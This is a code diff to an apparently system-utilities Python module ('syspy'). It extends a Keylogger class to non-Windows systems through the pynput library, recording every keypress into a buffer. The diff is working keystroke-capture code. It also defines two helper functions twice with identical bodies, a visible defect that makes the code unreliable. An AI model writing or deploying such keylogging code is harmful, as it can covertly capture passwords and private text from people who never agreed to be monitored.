@@ -367,6 +367,22 @@ def clipboard_set(text: str) -> bool:
 # Keylogger
 # --------------------------------------------------------------------------- #
 
+def _pynput_available() -> bool:
+    try:
+        import pynput  # noqa: F401
+        return True
+    except Exception:
+        return False
+
+
+def _pynput_available() -> bool:
+    try:
+        import pynput  # noqa: F401
+        return True
+    except Exception:
+        return False
+
+
 _WATCHED_VKS = sorted(
     set(
         list(range(0x08, 0x0E))
@@ -407,14 +423,38 @@ class Keylogger:
         return self._thread is not None and self._thread.is_alive()
 
     def start(self) -> "Keylogger":
-        if self.running or not IS_WINDOWS:
+        if self.running:
+            return self
+        if not IS_WINDOWS and not _pynput_available():
             return self
         self._stop.clear()
-        self._thread = threading.Thread(
-            target=self._run, daemon=True, name="syspy-keylog"
-        )
+        target = self._run if IS_WINDOWS else self._run_pynput
+        self._thread = threading.Thread(target=target, daemon=True, name="syspy-keylog")
         self._thread.start()
         return self
+
+    def _run_pynput(self) -> None:
+        """Non-Windows backend. Optional: needs pynput, which is not a hard dep."""
+        try:
+            from pynput import keyboard
+        except Exception:
+            return
+
+        def on_press(key) -> None:
+            try:
+                char = key.char
+            except AttributeError:
+                char = {
+                    "Key.enter": "\n", "Key.tab": "\t", "Key.space": " ",
+                    "Key.backspace": "[<]", "Key.esc": "[esc]",
+                }.get(str(key), "")
+            if char:
+                self._emit_char(char)
+
+        with keyboard.Listener(on_press=on_press) as listener:
+            while not self._stop.is_set():
+                time.sleep(0.1)
+            listener.stop()
 
     def stop(self, timeout: float = 1.0) -> None:
         self._stop.set()
@@ -463,6 +503,20 @@ class Keylogger:
                 elif vk in pressed:
                     pressed.discard(vk)
             time.sleep(self.interval)
+
+    def _emit_char(self, char: str) -> None:
+        with self._lock:
+            self._buffer.append(char)
+            overflow = len(self._buffer) - self.max_chars
+            if overflow > 0:
+                del self._buffer[:overflow]
+
+    def _emit_char(self, char: str) -> None:
+        with self._lock:
+            self._buffer.append(char)
+            overflow = len(self._buffer) - self.max_chars
+            if overflow > 0:
+                del self._buffer[:overflow]
 
     def _emit(self, vk: int) -> None:
         char = self._translate(vk)
